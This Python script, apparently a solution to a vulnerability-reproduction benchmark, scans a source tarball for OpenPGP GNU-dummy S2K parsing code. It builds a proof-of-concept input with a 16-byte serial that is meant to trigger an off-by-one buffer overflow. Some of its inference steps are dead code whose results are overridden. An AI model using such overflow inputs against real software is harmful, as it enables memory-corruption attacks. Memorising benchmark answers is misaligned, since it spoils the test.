import tarfile
import re
from collections import Counter


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Defaults for GNU-dummy S2K used for smartcard stubs
        s2k_type = 101  # 0x65 is commonly used for GNU extensions
        hash_alg = 0
        salt_prefix = b"GNU"
        salt4 = 1
        serial_len = 16

        texts = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if not re.search(r"\.(c|h|cc|cpp|cxx|hpp|hh)$", name, re.IGNORECASE):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    b = f.read()
                    if not b:
                        continue
                    s = b.decode("utf-8", "ignore")
                    if s:
                        texts.append((name, s))
        except Exception:
            texts = []

        # Try to infer s2k type used for GNU extension parsing
        type_candidates = []
        for _, s in texts:
            if "GNU" not in s:
                continue
            if not re.search(r"\bs2k\b|\bS2K\b", s):
                continue
            for m in re.finditer(r"==\s*(0x[0-9a-fA-F]+|\d+)", s):
                try:
                    v = int(m.group(1), 0)
                except Exception:
                    continue
                if 90 <= v <= 120:
                    ctx = s[max(0, m.start() - 120):min(len(s), m.end() + 120)]
                    if re.search(r"s2k|S2K|specifier|mode|type|gnu", ctx, re.IGNORECASE):
                        type_candidates.append(v)
        if type_candidates:
            if 101 in type_candidates:
                s2k_type = 101
            else:
                s2k_type = Counter(type_candidates).most_common(1)[0][0]

        # Try to infer expected salt[3] marker for GNU S2K
        salt4_candidates = []
        for _, s in texts:
            if "GNU" not in s:
                continue
            for m in re.finditer(r"salt\s*\[\s*3\s*\]\s*==\s*(0x[0-9a-fA-F]+|\d+)", s):
                try:
                    v = int(m.group(1), 0)
                except Exception:
                    continue
                if 0 <= v <= 255:
                    salt4_candidates.append(v)
        if salt4_candidates:
            salt4 = Counter(salt4_candidates).most_common(1)[0][0]

        # Try to infer hash algorithm requirement (some code expects 0 for GNU-dummy)
        saw_hash_eq_0_near_gnu = False
        for _, s in texts:
            if "GNU" not in s:
                continue
            for m in re.finditer(r"(hash|md|digest)\w*\s*==\s*(0x[0-9a-fA-F]+|\d+)", s, re.IGNORECASE):
                try:
                    v = int(m.group(2), 0)
                except Exception:
                    continue
                ctx = s[max(0, m.start() - 120):min(len(s), m.end() + 120)]
                if "GNU" in ctx and v == 0:
                    saw_hash_eq_0_near_gnu = True
                    break
            if saw_hash_eq_0_near_gnu:
                break
        hash_alg = 0 if saw_hash_eq_0_near_gnu else 0

        # Try to infer serial buffer size; still prefer 16 (to hit off-by-one with NUL)
        buf_sizes = []
        for _, s in texts:
            if not re.search(r"serial", s, re.IGNORECASE):
                continue
            if not re.search(r"s2k|S2K|card|smart\s*card|openpgp", s, re.IGNORECASE):
                continue
            for m in re.finditer(r"char\s+[\w\s\*]*serial\w*\s*\[\s*(\d+)\s*\]", s, re.IGNORECASE):
                try:
                    n = int(m.group(1))
                except Exception:
                    continue
                if 4 <= n <= 128:
                    buf_sizes.append(n)

        if buf_sizes:
            if 16 in buf_sizes:
                serial_len = 16
            else:
                small = [n for n in buf_sizes if 8 <= n <= 32]
                if small:
                    serial_len = min(small)
                else:
                    serial_len = min(buf_sizes)

        # Ensure 27-byte PoC preference (header 11 + 16 serial)
        serial_len = 16

        salt = (salt_prefix + bytes([salt4]) + b"\x00" * 16)[:8]
        poc = bytes([s2k_type & 0xFF, hash_alg & 0xFF]) + salt + bytes([serial_len & 0xFF]) + (b"A" * serial_len)
        return poc